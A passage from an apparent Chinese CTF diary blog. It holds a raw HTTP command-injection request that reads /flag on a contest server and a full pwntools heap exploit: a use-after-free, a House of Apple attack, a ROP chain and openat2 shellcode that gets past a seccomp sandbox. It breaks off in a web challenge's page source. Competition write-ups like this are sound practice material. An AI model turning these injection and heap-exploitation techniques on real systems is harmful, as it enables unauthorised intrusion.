punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        back_data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">elif</span> <span class="token keyword">not</span><span class="token punctuation">(</span>idcardf<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>idcard<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        back_data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">elif</span> birth <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">(</span>idcard<span class="token punctuation">)</span><span class="token punctuation">:</span>        back_data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">elif</span> <span class="token keyword">not</span><span class="token punctuation">(</span>sex<span class="token operator">==</span>sexs<span class="token punctuation">)</span><span class="token punctuation">:</span>        back_data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">elif</span> <span class="token keyword">not</span> is_valid<span class="token punctuation">:</span>        back_data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">elif</span> <span class="token keyword">not</span><span class="token punctuation">(</span>phonef<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>phone<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        back_data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">elif</span> <span class="token keyword">not</span><span class="token punctuation">(</span>phone_three <span class="token keyword">in</span> phon<span class="token punctuation">)</span><span class="token punctuation">:</span>        back_data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        i<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> da <span class="token keyword">in</span> back_data<span class="token punctuation">:</span>    i<span class="token operator">+=</span><span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>csv_file_path <span class="token operator">=</span> <span class="token string">"1.csv"</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>csv_file_path<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    writer <span class="token operator">=</span> csv<span class="token punctuation">.</span>writer<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>        <span class="token comment"># 写入表头</span>    writer<span class="token punctuation">.</span>writerow<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'sex'</span><span class="token punctuation">,</span> <span class="token string">'birth'</span><span class="token punctuation">,</span> <span class="token string">'idcard'</span><span class="token punctuation">,</span> <span class="token string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment"># 写入数据行</span>    <span class="token keyword">for</span> da <span class="token keyword">in</span> back_data<span class="token punctuation">:</span>        writer<span class="token punctuation">.</span>writerow<span class="token punctuation">(</span><span class="token punctuation">[</span>da<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> da<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> da<span class="token punctuation">[</span><span class="token string">'sex'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> da<span class="token punctuation">[</span><span class="token string">'birth'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> da<span class="token punctuation">[</span><span class="token string">'idcard'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> da<span class="token punctuation">[</span><span class="token string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"数据已成功写入到 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>csv_file_path<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="httpd"><a href="#httpd" class="headerlink" title="httpd"></a>httpd</h3><p>漏洞点出在<code>stream = popen(haystack, modes);</code>，直接通过<code>/</code>+指令即可使用系统指令，但直接<code>cat</code>并不会显示，所以我<code>cat</code>之后存到<code>aaa.txt</code>再访问<code>aaa.txt</code>（嗯没错我是用<code>bp</code>写的嘻嘻</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/cat%20%2Fflag%20%3E%20aaa.txt</span> <span class="token http-version property">HTTP/1.0</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">139.155.126.78:36321</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">0</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/aaa.txt</span> <span class="token http-version property">HTTP/1.0</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">139.155.126.78:36321</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">0</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="sandbox"><a href="#sandbox" class="headerlink" title="sandbox"></a>sandbox</h3><p>看似简单实则熬了一晚还没打通远程..挺奇怪的，限制堆的大小在<code>0x500-0x900</code>，存在<code>uaf</code>漏洞，禁用了<code>open openat execve execveat</code>，且限制<code>x86-64</code>架构，先用<code>house of apple</code>打<code>large bin</code>，再写<code>shellcode</code>打<code>openat2</code>，这样本地能通，远程没通，回头学一下<code>fork + ptrace</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> pwnlib<span class="token punctuation">.</span>shellcraft <span class="token keyword">as</span> sccontext<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'49.234.30.109'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x540</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x520</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x530</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1f6cc0</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x550</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x290</span>li<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span>_IO_list_all <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_list_all'</span><span class="token punctuation">]</span>_IO_wfile_jumps <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_wfile_jumps'</span><span class="token punctuation">]</span>leave_ret <span class="token operator">=</span> <span class="token number">0x0000000000050877</span> <span class="token operator">+</span> libc_basedelete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>p1 <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_base <span class="token operator">+</span> <span class="token number">0x290</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>_IO_list_all <span class="token operator">-</span> <span class="token number">0x20</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x550</span><span class="token punctuation">)</span>heap_addr <span class="token operator">=</span> heap_base <span class="token operator">+</span> <span class="token number">0x550</span> <span class="token operator">+</span> <span class="token number">0x530</span> <span class="token operator">+</span> <span class="token number">0x290</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000023b65</span> <span class="token operator">+</span> libc_basepop_rax_ret <span class="token operator">=</span> <span class="token number">0x000000000003fa43</span> <span class="token operator">+</span> libc_basepop_rsi_ret <span class="token operator">=</span> <span class="token number">0x00000000000251be</span> <span class="token operator">+</span> libc_basepop_rdx_ret <span class="token operator">=</span> <span class="token number">0x0000000000166262</span> <span class="token operator">+</span> libc_basesyscall_ret <span class="token operator">=</span> <span class="token number">0x0000000000120975</span> <span class="token operator">+</span> libc_basesetcontext <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">61</span>rsp <span class="token operator">=</span> heap_addr <span class="token operator">+</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0xe8</span> <span class="token operator">+</span> <span class="token number">0x70</span>rsi <span class="token operator">=</span> rsp<span class="token comment">#0x000000000010bc5f: mov rdx, qword ptr [rax + 0x38]; call qword ptr [rax + 0x10];</span>gadget <span class="token operator">=</span> <span class="token number">0x000000000010bc5f</span> <span class="token operator">+</span> libc_basep <span class="token operator">=</span> <span class="token string">b''</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsp<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'flag\x00'</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>p2 <span class="token operator">=</span> <span class="token string">b''</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_addr <span class="token operator">+</span> <span class="token number">0xe0</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xc8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>_IO_wfile_jumps<span class="token punctuation">)</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0xe0</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_addr <span class="token operator">+</span> <span class="token number">0xe0</span> <span class="token operator">+</span> <span class="token number">0xe8</span><span class="token punctuation">)</span>p2 <span class="token operator">+=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>setcontext<span class="token punctuation">)</span>p2 <span class="token operator">+=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_base <span class="token operator">+</span> <span class="token number">0x7e0</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0xe8</span> <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p2<span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>mmap<span class="token punctuation">(</span><span class="token number">0x50000</span><span class="token punctuation">,</span> <span class="token number">0x7e</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#0x67616c66</span>shellcode <span class="token operator">+=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''    mov rax, 0x67616c66    push rax    xor rdi, rdi    sub rdi, 100    mov rsi, rsp    push 0    push 0    push 0    mov rdx, rsp    mov r10, 0x18    push SYS_openat2    pop rax    syscall'''</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">"rax"</span><span class="token punctuation">,</span> <span class="token number">0x50000</span> <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x50000</span> <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'5'</span><span class="token punctuation">)</span>rop <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21000</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_base <span class="token operator">+</span> <span class="token number">0xf38</span> <span class="token operator">+</span> <span class="token number">0x50</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span> shellcoder<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="8-30"><a href="#8-30" class="headerlink" title="#8.30"></a>#8.30</h2><p>改了一天论文…困困困</p><h2 id="8-31"><a href="#8-31" class="headerlink" title="#8.31"></a>#8.31</h2><p>写了俩<code>web</code>嗯</p><h3 id="勇闯铜人阵"><a href="#勇闯铜人阵" class="headerlink" title="勇闯铜人阵"></a>勇闯铜人阵</h3><p>网页源码</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>听声辩位<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/style.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>听声辩位<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>闯关弟子注意，本关继续考验你听声辩位的功夫<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>你可定坐中央，先后将有五波数字抛出，你需要在3秒内按要求说出方位<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>示例：1 -> 北方<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>2,3 -> 东北方一个，东方一个<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>输入选手名字和 "弟子明白" 开始游戏<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>parent<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/images/test.png<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token 